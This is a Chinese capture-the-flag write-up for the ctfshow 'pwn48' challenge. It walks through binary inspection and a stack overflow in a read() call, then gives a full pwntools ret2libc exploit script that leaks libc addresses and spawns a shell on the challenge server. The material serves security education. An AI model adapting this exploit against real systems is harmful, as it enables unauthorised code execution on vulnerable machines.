```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn48
```

```
tasike@tasike-VM:~/Desktop$ file pwn48
pwn48: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d83178d575075df9b53f152d38a5e200895a3da2, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn48
[*] '/home/tasike/Desktop/pwn48'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`32bit`，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  logo();
  puts("O.o?");
  ctfshow();
  return 0;
}
```

跟进`ctfshow`

```c
ssize_t ctfshow()
{
  char buf[103]; // [esp+Dh] [ebp-6Bh] BYREF

  return read(0, buf, 0xC8u);
}
```

> `buf`与`ebp`距离`0x6B`

没有`system`和`/bin/sh`

因此利用`ret2libc`



编写`attack48.py`

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28270)

elf = ELF('./pwn48')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = cyclic(0x6B + 0x4) + p32(puts_plt) + p32(main) + p32(puts_got)
r.sendline(payload)
puts = u32(r.recvuntil('\xf7')[-4:])
print(hex(puts))

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x6B + 0x4) + p32(system) + p32(0) + p32(binsh)
r.sendline(payload)
r.interactive()
```

